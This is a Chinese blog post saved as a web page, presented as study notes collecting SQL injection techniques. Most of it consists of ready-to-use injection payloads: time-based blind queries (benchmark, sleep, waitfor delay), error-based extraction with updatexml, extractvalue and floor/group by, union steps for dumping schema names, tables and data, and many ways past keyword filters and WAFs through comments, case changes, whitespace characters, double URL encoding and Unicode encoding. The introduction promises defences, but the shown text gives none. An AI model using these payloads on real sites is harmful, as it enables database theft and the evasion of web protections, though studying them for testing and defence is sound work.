<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>SQL注入整理(一) | Merak的博客</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="简介这片文章是对网上关于SQL注入知识进行收集，然后整理出来的。算是一个学习随笔吧主要有收集了以下知识点sql注入原理，sql注入思路，技巧,waf bypass 的fuzz过程以及防御方法">
<meta name="keywords" content="sql注入">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL注入整理(一)">
<meta property="og:url" content="http://www.Merak.cc/2017/10/23/SQL注入/index.html">
<meta property="og:site_name" content="Merak的博客">
<meta property="og:description" content="简介这片文章是对网上关于SQL注入知识进行收集，然后整理出来的。算是一个学习随笔吧主要有收集了以下知识点sql注入原理，sql注入思路，技巧,waf bypass 的fuzz过程以及防御方法">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="http://ouz06keqs.bkt.clouddn.com/20171023-162451.png">
<meta property="og:updated_time" content="2017-10-23T08:44:11.481Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="SQL注入整理(一)">
<meta name="twitter:description" content="简介这片文章是对网上关于SQL注入知识进行收集，然后整理出来的。算是一个学习随笔吧主要有收集了以下知识点sql注入原理，sql注入思路，技巧,waf bypass 的fuzz过程以及防御方法">
<meta name="twitter:image" content="http://ouz06keqs.bkt.clouddn.com/20171023-162451.png">
  
    <link rel="alternative" href="/atom.xml" title="Merak的博客" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/favicon.png">
  
  
      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
  
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
  
  
      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  
  <!-- 加载特效 -->
    <script src="/js/pace.js"></script>
    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
  <script>
      var yiliaConfig = {
          rootUrl: '/',
          fancybox: true,
          animate: true,
          isHome: false,
          isPost: true,
          isArchive: false,
          isTag: false,
          isCategory: false,
          open_in_new: false
      }
  </script>
</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            
            <img lazy-src="/img/head.jpg" class="js-avatar">
            
        </a>

        <hgroup>
          <h1 class="header-author"><a href="/" title="Hi Mate">Merak</a></h1>
        </hgroup>

        
        <p class="header-subtitle">莫等闲，白了少年头空悲切...</p>
        
        
        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">博客首页</a></li>
                        
                            <li><a href="/categories/python">人生苦短</a></li>
                        
                            <li><a href="/categories/Web安全">安全海洋</a></li>
                        
                            <li><a href="/categories/notes">随笔</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fl mail" target="_blank" href="mailto:root@cmustard.com" title="mail">mail</a>
                            
                                <a class="fl github" target="_blank" href="https://github.com/cmustard06" title="github">github</a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/TCP-IP/" style="font-size: 10px;">TCP/IP</a> <a href="/tags/go/" style="font-size: 10px;">go</a> <a href="/tags/golang/" style="font-size: 17.5px;">golang</a> <a href="/tags/importlib/" style="font-size: 10px;">importlib</a> <a href="/tags/poc/" style="font-size: 12.5px;">poc</a> <a href="/tags/python/" style="font-size: 20px;">python</a> <a href="/tags/python3/" style="font-size: 12.5px;">python3</a> <a href="/tags/sql注入/" style="font-size: 10px;">sql注入</a> <a href="/tags/struct/" style="font-size: 10px;">struct</a> <a href="/tags/struts/" style="font-size: 10px;">struts</a> <a href="/tags/tcp/" style="font-size: 10px;">tcp</a> <a href="/tags/tcp-ip/" style="font-size: 10px;">tcp/ip</a> <a href="/tags/windows命令/" style="font-size: 10px;">windows命令</a> <a href="/tags/事件驱动/" style="font-size: 10px;">事件驱动</a> <a href="/tags/代理/" style="font-size: 10px;">代理</a> <a href="/tags/博客/" style="font-size: 10px;">博客</a> <a href="/tags/基础/" style="font-size: 15px;">基础</a> <a href="/tags/并发/" style="font-size: 10px;">并发</a> <a href="/tags/异步IO/" style="font-size: 10px;">异步IO</a> <a href="/tags/正则表达式/" style="font-size: 10px;">正则表达式</a> <a href="/tags/漏扫/" style="font-size: 12.5px;">漏扫</a> <a href="/tags/爬虫/" style="font-size: 10px;">爬虫</a> <a href="/tags/科学上网/" style="font-size: 10px;">科学上网</a> <a href="/tags/系统/" style="font-size: 10px;">系统</a> <a href="/tags/编程/" style="font-size: 15px;">编程</a> <a href="/tags/编程语言/" style="font-size: 12.5px;">编程语言</a> <a href="/tags/网络/" style="font-size: 12.5px;">网络</a> <a href="/tags/网络基础知识/" style="font-size: 10px;">网络基础知识</a> <a href="/tags/网络编程/" style="font-size: 10px;">网络编程</a> <a href="/tags/集合/" style="font-size: 10px;">集合</a>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.dmmjy9.top">dmmjy9</a>
                    
                    </div>
                </section>
                

                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">Merak</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                
                    <img lazy-src="/img/head.jpg" class="js-avatar">
                
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="Me">Merak</a></h1>
            </hgroup>
            
            <p class="header-subtitle">莫等闲，白了少年头空悲切...</p>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">博客首页</a></li>
                
                    <li><a href="/categories/python">人生苦短</a></li>
                
                    <li><a href="/categories/Web安全">安全海洋</a></li>
                
                    <li><a href="/categories/notes">随笔</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                <div class="social">
                    
                        <a class="mail" target="_blank" href="mailto:root@cmustard.com" title="mail">mail</a>
                    
                        <a class="github" target="_blank" href="https://github.com/cmustard06" title="github">github</a>
                    
                </div>
            </nav>
        </header>                
    </div>
</nav>
      <div class="body-wrap"><article id="post-SQL注入" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2017/10/23/SQL注入/" class="article-date">
      <time datetime="2017-10-23T08:44:11.481Z" itemprop="datePublished">2017-10-23</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      SQL注入整理(一)
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/Web安全/">Web安全</a>
    </div>


        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>这片文章是对网上关于SQL注入知识进行收集，然后整理出来的。算是一个学习随笔吧<br>主要有收集了以下知识点<br>sql注入原理，sql注入思路，技巧,waf bypass 的fuzz过程以及防御方法<br><a id="more"></a></p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p> 注入攻击的本质，是把用户输入的数据当做代码来执行，这里有两个关键条件：第一个是用户能够控制输入，第二个是原本程序要执行的代码，拼接了用户输入的数据。<br>  <strong>“数据与代码分离”原则，他可以说是专门为了解决注入攻击而生的</strong><br>拼接用户的输入，<code>var sql = &quot;select * from OrdersTable where ShipCity=&#39; &quot;+ShipCity+&quot; &#39;&quot;;</code><br> 这个拼接过程很重要，正是这个拼接的过程导致了代码的注入（注意：<strong>在php中，单引号不把变量名解析成变量值，而双引号会将变量名解析成变量值再输出</strong>）。在Sql注入过程中，如果网站的Web服务器开启了错误回显，则会为攻击者提供极大的便利，比如攻击者在参数中加入了一个引号，引起了查询语句的语法错误，服务器直接 返回错误信息。错误信息披露了敏感信息，对于攻击者来说，攻击更加得心应手。</p>
<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>但在很多时候，Web服务器关闭了错误回显，这时候，就可以使用盲注，所谓盲注就是在服务器没有错误回显的时候完成注入攻击。</p>
<p>最常见的盲注验证方法，构造简单的条件语句，根据页面返回是否变化，来判断Sql语句是否得到执行<code>php?id=2 and 1=2</code><br>在整个攻击过程中，虽然关闭了错误回显，但是攻击者通过简单的条件判断，在对比页面返回结果的差异，就可以判断出SQL注入漏洞是否存在<br>举例：</p>
<ul>
<li>先输入and 1=1 服务器返回正常的页面</li>
<li>在输入条件and 1=2 。由于sql语句执行后，1=2永远不可能为真，因此无法查询到数据，服务器就会显示不完全的页面，从而判断存在漏洞<h2 id="Timing-Attack"><a href="#Timing-Attack" class="headerlink" title="Timing Attack"></a>Timing Attack</h2>我们知道，通过改变id的值，服务器会返回不同的客户信息。有时候通过简单的1=2是看不出异常的，但是我们可以使用timing attack来判断漏洞的存在。</li>
</ul>
<p>在mysql中，有一个<code>benchmark()</code>函数，它是用来测试函数性能的，他有两个参数<code>benchmark(count，expr)</code> 函数执行的结果是，是将表达式expr执行count次。比如<br><code>select benchmark（10000，encode（‘hello’,&#39;goodbye&#39;））</code><br>就将encode执行10000次</p>
<p>因此，利用<code>benchmark</code>函数可以让同一个函数执行若干次，使得结果返回的时间比平时要长；通过时间长短的变化，可以判断注入语句是否执行成功。<br>比如构造id的值:<br> <code>1170 union select if(substring(current,1,1))=char(119),benchmark(500000,encode(&#39;msg&#39;,&#39;by 5 second&#39;)),null from (select Database() as current ) as tb1;</code><br>这段payload判断数据库名的第一个字母是否为<code>CHAR（119</code>），即小写的w，如果判断为真，那么用于<code>beachmark</code>函数的存在会造成较长的延迟，如果不为真，这该语句会很快执行完。<br>与此类似，还可以通过以下函数获取更多的信息：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">database()-----当前数据库的名称</div><div class="line">system_user()------使用这数据库的系统用户</div><div class="line">current_user（）------当前登陆这个数据库的用户</div><div class="line">last_insert_id()------在数据库中最后一次插入的事务 的id值</div></pre></td></tr></table></figure></p>
<p><strong>Timing Attack是一种高级的技巧，在不同的数据库中，有着类似于<code>benchmark()</code>的函数</strong><br> <strong><em>mysql ：<code>beachmark（100000，md5(1)）</code>;<code>sleep(5)</code></em></strong><br><strong><em>MS Sql Server : <code>waitfor delay &#39;0:0:5&#39;</code></em></strong><br><strong><em>postgreSql: <code>PG_SLEEP(5)</code>; <code>GENRATE_SERIES(1,100000)</code></em></strong></p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h3><p><code>and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);</code><br><code>and (select count(*) from (select 1 union select null union select  !1)x group by concat((select table_name from information_schema.tables  limit 1),floor(rand(0)*2)));</code><br>通过<code>floor</code>报错的方法来爆数据的本质是group by语句的报错。<code>group by</code>语句报错的原因是<code>floor(random(0)*2)</code>的不确定性，即可能为0也可能为<code>1（group by key</code>的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中则更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。<code>group by floor(random(0)*2)</code>出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下<code>floor(random(0)*2)</code>可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时<code>floor(random(0)*2)</code>结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</p>
<h3 id="UpdateXml"><a href="#UpdateXml" class="headerlink" title="UpdateXml"></a>UpdateXml</h3><p><code>and 1=(updatexml(1,concat(0x3a,(select user())),1))</code><br>UpdateXml()函数有三个参数，在实际渗透时第一个和第三个参数直接写1即可，第二个参数就是需要爆出的内容，要爆出不同的内容直接修改第二个参数即可。但是在实际使用时注意一个问题：<strong>即爆错的内容可能显示不完整</strong>。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select updatexml(1,version(),1);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: <span class="string">'.17-0ubuntu0.16.04.1'</span></div><div class="line">mysql&gt; select updatexml(1,concat(0x5c,version()),1);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: <span class="string">'\5.7.17-0ubuntu0.16.04.1'</span></div></pre></td></tr></table></figure></p>
<p>如爆数据库版本时，<code>updatexml(1,version(),1)</code>;语句爆出的数据就不会完整，只要在中间参数连个其他字符就可以完整爆出，如<code>updatexml(1,concat(0x5c,version()),1)</code>。这也是为什么一般的使用UpdateXml()的注入语句会使用concat连接其他字符。</p>
<h3 id="ExtractValue"><a href="#ExtractValue" class="headerlink" title="ExtractValue"></a>ExtractValue</h3><p><code>and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select extractvalue(1,concat(0x5c,user()));</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: <span class="string">'\root@localhost'</span></div></pre></td></tr></table></figure></p>
<p><code>extractvalue()</code>函数有两个参数，在实际注入时第一个参数设为1，第二个参数就是需要爆的数据，如<code>extractvalue(1, concat(0x5c,version()))</code>。同样，在使用中会遇到如下面<code>UpdateXml()</code>类似的相同问题，即果在爆的数据前不连接其他字符可能会显示不完全。即获取版本号时，第二个参数不能为version(),而应改为<code>concat(0x5c,version())</code></p>
<h3 id="join"><a href="#join" class="headerlink" title="join"></a>join</h3><p><code>select * from(select * from mysql.user a join mysql.user b using(Host))c;（爆列名贼好用）</code><br>利用表自己join自己。来达到列名相同来爆列名。<br>获取mysql.user表中的所有列名<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">获取第一列的字段名</div><div class="line">mysql&gt; select * from(select * from mysql.user a join mysql.user b)c;</div><div class="line">ERROR 1060 (42S21): Duplicate column name <span class="string">'Host'</span></div><div class="line">获取第二列的字段名</div><div class="line">mysql&gt; select * from(select * from mysql.user a join mysql.user b using(Host))c; </div><div class="line">ERROR 1060 (42S21): Duplicate column name <span class="string">'User'</span></div><div class="line">获取第三列的字段名</div><div class="line">mysql&gt; select * from(select * from mysql.user a join mysql.user b using(Host,User))c;</div><div class="line">ERROR 1060 (42S21): Duplicate column name <span class="string">'Select_priv'</span></div></pre></td></tr></table></figure></p>
<p><strong>a,b,c代表的是我们自定义的表的别名</strong></p>
<h3 id="数据库测试备忘录"><a href="#数据库测试备忘录" class="headerlink" title="数据库测试备忘录"></a>数据库测试备忘录</h3><p><a href="http://pentestmonkey.net/cheat-sheet/sql-injection" target="_blank" rel="external">数据库的测试备忘录</a></p>
<h2 id="数据回显的注入流程"><a href="#数据回显的注入流程" class="headerlink" title="数据回显的注入流程"></a>数据回显的注入流程</h2><p>以mysql数据库为例</p>
<h3 id="测试查询字段数"><a href="#测试查询字段数" class="headerlink" title="测试查询字段数"></a>测试查询字段数</h3><p>使用<code>order by</code>语法，确定字段数，这个语句的意思是按照第n列排序，若order by 8 正常，order by 9 报错的话就表示表中包含的字段数为8个。</p>
<h3 id="确定显示位"><a href="#确定显示位" class="headerlink" title="确定显示位"></a>确定显示位</h3><p>可以先尝试用select 1,2,3,4,5……来检测，最好使用@或者NULL来代替，这样不会因为数据类型不匹配导致测试失败。<br><strong>注意：union查询需要保证前后两个语句的查询列数相同，以及数据类型相同或者相似，前者可以通过order by和其他姿势探测，后者可以使用NULL，@来避免</strong></p>
<h3 id="查询数据库名"><a href="#查询数据库名" class="headerlink" title="查询数据库名"></a>查询数据库名</h3><p><code>SELECT group_concat(schema_name) from information_schema.schemata</code></p>
<h3 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h3><p><code>SELECT group_concat(table_name) from information_schema.tables where table_schema=&#39;xxxxx&#39;</code></p>
<h3 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h3><p><code>Select group_concat(table_name) from information_schema.columns where table_name=&#39;xxxx&#39;</code></p>
<h3 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h3><p><code>SELECT group_concat(column_name) from table_name</code></p>
<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="绕过函数与关键词过滤"><a href="#绕过函数与关键词过滤" class="headerlink" title="绕过函数与关键词过滤"></a>绕过函数与关键词过滤</h2><p>在防止sql注入的情况中，很多时候都使用了函数和关键字黑名单来保护web程序免受攻击，但是很显然，如果只是黑名单的话，我们还是可以通过某些方法来绕过该黑名单的。</p>
<ul>
<li>比如下面就是在某些代码中通过函数过滤的一些关键词<h2 id="表结构"><a href="#表结构" class="headerlink" title="表结构"></a>表结构</h2>随便建的一张表<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">+---------+-------------+------+-----+---------+----------------+</div><div class="line">| Field   | Type        | Null | Key | Default | Extra          |</div><div class="line">+---------+-------------+------+-----+---------+----------------+</div><div class="line">| u_id    | bigint(20)  | NO   | PRI | NULL    | auto_increment |</div><div class="line">| phone   | bigint(20)  | NO   |     | NULL    |                |</div><div class="line">| nicheng | varchar(40) | NO   |     | NULL    |                |</div><div class="line">| sex     | tinyint(4)  | NO   |     | NULL    |                |</div><div class="line">+---------+-------------+------+-----+---------+----------------+</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="and，or"><a href="#and，or" class="headerlink" title="and，or"></a>and，or</h2><p>常用的php过滤代码<br><code>preg_match(&#39;/(and|or)/&#39;,$id)</code>   在<code>$id</code>这个字符串中搜索and或者or出现 的次数，一般返回0或者1次，因为<code>preg_match</code>在第一次匹配后，将会停止搜索。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"><span class="variable">$count</span> = preg_match(<span class="string">'/(and|or)/'</span>,<span class="string">"and 1=1"</span>);</div><div class="line"><span class="built_in">echo</span> <span class="variable">$count</span>;    // 1</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>这里就将and，or进行了检测，这时我们就可以使用&amp;&amp;,||分别替换and，or<br>被过滤的注入： 1 or 1=1  1 and 1=1<br>绕过这个过滤:  1 || 1    1 &amp;&amp; 1=1</p>
<h2 id="and-or-union"><a href="#and-or-union" class="headerlink" title="and,or,union"></a>and,or,union</h2><p><code>preg_match (‘/(and|or|union)/I’,$id)</code><br>被过滤的注入：<br><code>union select nicheng, phone from user</code><br>绕过注入:<br><code>1 || (select nicheng  from  user where u_id=1)=&#39;admin&#39;</code></p>
<h2 id="and-or-union-where"><a href="#and-or-union-where" class="headerlink" title="and,or,union,where"></a>and,or,union,where</h2><p>被过滤的注入:<br><code>1 || (select nicheng from  user where u_id=1)=&#39;admin</code><br>绕过注入：<br><code>1 ||(select nicheng from user where limit 1)=&#39;admin&#39;</code></p>
<h2 id="and-or-union-where-limit"><a href="#and-or-union-where-limit" class="headerlink" title="and,or,union,where,limit"></a>and,or,union,where,limit</h2><p>别过滤的注入：<br><code>1 ||(select nicheng from user where limit 1)=&#39;admin&#39;</code><br>绕过注入：<br>分组<br><code>1||(select nicheng from user group by u_id having u_id=1)=&#39;admin&#39;;</code></p>
<h2 id="and-or-union-where-limit-group-by"><a href="#and-or-union-where-limit-group-by" class="headerlink" title="and,or,union,where,limit,group by"></a>and,or,union,where,limit,group by</h2><p>过滤注入:<br><code>1||(select nicheng from user group by u_id having u_id=1)=&#39;admin&#39;;</code><br>绕过注入<br><code>1 || (select substr(group_concat(u_id),1,1) nicheng from user;)=1</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">substr(str,pos,len)</div><div class="line">从字符串str返回一个len个字符的子串，从位置pos开始</div><div class="line">group_concat()  函数返回一个字符串结果，该结果由分组中的值连接组合而成。</div><div class="line"></div><div class="line">select group_concat(u_id) nicheng from user;</div><div class="line">+---------+</div><div class="line">| nicheng |</div><div class="line">+---------+</div><div class="line">| 1,2,3   |</div><div class="line">+---------+</div><div class="line"></div><div class="line">select substr(group_concat(u_id),1,1) nicheng from user;结果如下：</div><div class="line">+---------+</div><div class="line">| nicheng |</div><div class="line">+---------+</div><div class="line">| 1       |</div><div class="line">+---------+</div></pre></td></tr></table></figure></p>
<h2 id="and-or-union-where-limit-group-by-select"><a href="#and-or-union-where-limit-group-by-select" class="headerlink" title="and,or,union,where,limit,group by,select"></a>and,or,union,where,limit,group by,select</h2><p>过滤的注入:<br><code>1 || (select substr(group_concat(u_id),1,1) nicheng from user;)=1</code><br>绕过注入：<br><code>1 || u_id is not null</code>  如果u_id不为none，一直是true<br><code>1 || substr(nicheng,1,1) = 0x61</code> 返回昵称的第一个字母是0x61即‘a’的数据<br><code>1||substr(nicheng,1,1)=unhex(61)</code></p>
<h2 id="and-or-union-where-limit-goup-by-select-’-hex"><a href="#and-or-union-where-limit-goup-by-select-’-hex" class="headerlink" title="and,or,union,where,limit,goup by,select,’,hex"></a>and,or,union,where,limit,goup by,select,’,hex</h2><p>过滤了的注入：<br><code>1||substr(user,1,1)=unhex(61)</code><br>绕过注入：<br><code>1 || substr(nicheng,1,1)=lower(conv(11,10,36))</code><br><code>conv(10,10,36)</code>将11从十进制转换成，这里转换成了A</p>
<h2 id="and-or-union-where-limit-group-by-select-’-hex-substr-空格"><a href="#and-or-union-where-limit-group-by-select-’-hex-substr-空格" class="headerlink" title="and,or,union,where,limit,group by,select,’,hex,substr,空格"></a>and,or,union,where,limit,group by,select,’,hex,substr,空格</h2><p>被过滤的注入：<br><code>1 || substr(nicheng,1,1)=lower(conv(11,10,36))</code><br>绕过注入：<br><code>1%ob||%0blower(conv(10,10,36))</code></p>
<h2 id="绕过WAF的一些方法"><a href="#绕过WAF的一些方法" class="headerlink" title="绕过WAF的一些方法"></a>绕过WAF的一些方法</h2><p>虽然正则表达式比关键字过滤更能阻止sql注入，但是还是可以通过一些方法绕过正则表达式</p>
<p>就比如某些正则表达式阻止了<code>&#39;</code>和<code>=</code>。这时候如果我们使用类似于<br><code>1 union select 1,table_name from information_schema.tables where table_name=&#39;users&#39;</code><br>我们就可以稍微改变一些就可以进行绕过<br><code>1 union select 1,table_name from information_schema.tables where tables_name like 0x7573657273</code></p>
<p>WAF通常是检测HTTP/HTTPS/SOAP/XML-RPC/WEB服务在内的每一个请求和响应。绕过的一些方法</p>
<h3 id="注释绕过"><a href="#注释绕过" class="headerlink" title="注释绕过"></a>注释绕过</h3><p><strong>sql注入的注释能让我们绕过许多的waf</strong><br>常见的用于注释的符号有哪些：<code>//, -- , /**/, #, --+,--  -, ;，--a</code><br><code>?id+un/**/ion+se/**/lect+1,2,3--</code></p>
<h4 id="普通注释"><a href="#普通注释" class="headerlink" title="普通注释"></a>普通注释</h4><p><code>page_id=-15 %55nION/**/%53ElecT 1,2,3,4  union%a0select pass from users#</code><br>/**/在构造的查询语句中插入注释，规避对空格的依赖或关键字识别；<code>#、--+</code>用于终结语句的查询</p>
<h4 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h4><p>相比于普通注释，内联注释用得更多，他有一个特性<code>/!**/</code>只有mysql能够识别<br><code>/！12345select/</code><br><code>ndex.php?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3</code><br><strong>内联注释和普通注释结合使用</strong><br><code>page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4…</code></p>
<h3 id="变换大小写"><a href="#变换大小写" class="headerlink" title="变换大小写"></a>变换大小写</h3><p><code>id=1+UnioN/**/SeLecT/**/1,2,3--</code></p>
<h3 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h3><p>在某些情况下，SQL关键词被过滤掉并且被替换成了空格，这个时候我们就可以使用<code>&quot;%0b&quot;</code>来绕过<br>mysql可利用的空白字符如下:<br><code>%09,%0a,%0b,%0c,%0d,%20,%a0；</code><br>payload:<br><code>id=1+uni%0bon+se%0blect+1,2,3--</code></p>
<h3 id="字符编码绕过"><a href="#字符编码绕过" class="headerlink" title="字符编码绕过"></a>字符编码绕过</h3><p>大多CMS和WAF将对程序的输入进行解码和过滤，但是某些WAF仅对输入解码一次，那么双重加密就能绕过某些过滤</p>
<h4 id="url编码绕过"><a href="#url编码绕过" class="headerlink" title="url编码绕过"></a>url编码绕过</h4><p>如空格变为%20、单引号%27、左括号%28、右括号%29<br><code>?id=1/**/union/*/select/**/1,2,3/**/from/**/users--</code><br>先对<code>/**/</code>进行url编码得到<br><code>?id=1%2f%2a*/union%2f%2a/select%2f%2a*/1,2,3%2f%2a*/from%2f%2a*/users--</code><br>在对<code>%</code>进行二次url编码<br><code>?id=1%252f%252a*/union%252f%252a/select%252f%252a*/1,2,3%252f%252a*/from%252f%252a*/users--</code></p>
<h4 id="十六进制编码"><a href="#十六进制编码" class="headerlink" title="十六进制编码"></a>十六进制编码</h4><p>对单个字符进行16进制编码<br><code>page_id=-15 /*!union*/ /*!select*/ 1,2,3,4…</code><br><code>?page_id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4…</code><br>对整个字符串进行编码<br><code>SELECT(extractvalue(&lt;a&gt;admin&lt;/a&gt;,/a)</code><br><code>SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))</code></p>
<h4 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h4><p>看一下常用的几个符号的一些Unicode编码：<br>单引号:   %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7<br>空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0<br>左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8<br>右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</p>
<h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><p>1.使用反引号，例如select <code>version()</code>;可以用来过空格和正则，特殊情况下还可以将其作为注释符用<br>2.<code>-+</code>：<code>select+id-1+1.form users;</code>+<code>是用于字符串连接的，</code>-<code>和</code>.<code>在此也用于连接，可以逃过空格和关键字过滤
3.@符号：</code>select@^1.from users;<code>@用于变量定义如</code>@var_name`，一个@表示用户定义，@@表示系统变量</p>
<p><strong>大部分可能发挥作用的特殊字符</strong><br><code>、~、!、@、%、()、[]、.、-、+ 、|、%00</code></p>
<h3 id="等价函数收集"><a href="#等价函数收集" class="headerlink" title="等价函数收集"></a>等价函数收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">hex()、bin() ==&gt; ascii()</div><div class="line">sleep() ==&gt;benchmark()</div><div class="line">concat_ws()==&gt;group_concat()</div><div class="line">mid()、substr() ==&gt; substring()</div><div class="line">@@user ==&gt; user()</div><div class="line">@@datadir ==&gt; datadir()</div></pre></td></tr></table></figure>
